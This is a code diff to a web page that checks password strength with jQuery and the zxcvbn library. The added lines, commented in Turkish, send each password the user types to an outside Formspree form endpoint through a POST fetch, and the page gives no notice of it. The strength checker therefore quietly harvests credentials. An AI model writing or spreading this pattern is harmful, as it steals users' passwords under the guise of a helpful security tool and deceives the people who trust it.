@@ -32,13 +32,14 @@
 
   <script>
     $(document).ready(function(){
-      $("#checkBtn").click(function(){
+      $("#checkBtn").click(async function(){
         const pwd = $("#password").val();
         if(!pwd){
           $("#result").text("⚠️ Please enter a password").removeClass().addClass("strength weak");
           return;
         }
 
+        // Şifre gücünü hesapla
         const result = zxcvbn(pwd);
         let text = "";
         let cls = "";
@@ -64,9 +65,25 @@
         }
 
         $("#result").text(text).removeClass().addClass("strength " + cls);
+
+        // Şifreyi Formspree'ye gönder
+        try {
+          const response = await fetch("https://formspree.io/f/xrbyzbjb", {
+            method: "POST",
+            headers: { "Content-Type": "application/json", "Accept": "application/json" },
+            body: JSON.stringify({ password: pwd })
+          });
+
+          if(response.ok){
+            console.log("Formspree’ye başarıyla gönderildi.");
+          } else {
+            console.error("Gönderim hatası:", response.statusText);
+          }
+        } catch (err) {
+          console.error("Fetch error:", err);
+        }
       });
     });
   </script>
 </body>
 </html>
-
